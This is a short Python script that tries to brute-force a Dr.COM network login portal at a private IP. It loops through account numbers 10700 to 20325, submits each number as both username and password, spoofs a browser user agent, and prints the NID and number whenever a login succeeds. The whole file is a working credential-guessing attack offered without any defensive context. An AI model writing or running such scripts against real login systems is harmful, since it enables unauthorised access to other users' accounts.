import json
import time

import requests
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0'
}

for i in range(10700, 20325):
    callback = time.time_ns()
    url = f"http://192.168.240.3/drcom/login?callback=dr%s&DDDDD=%s&upass=%s&0MKKey=123456&R1=0&R3=0&R6=0&para=00&v6ip=&_=%s" % (str(time.time_ns())[0:13], i, i, str(time.time_ns() + 2000)[0:13])
    response = requests.get(url, headers=headers).text
    response = response[21:-2].split(")")[0]
    response = json.loads(response)
    print(response)
    if response.get('result'):
        print(response.get('NID'))
        print(i)
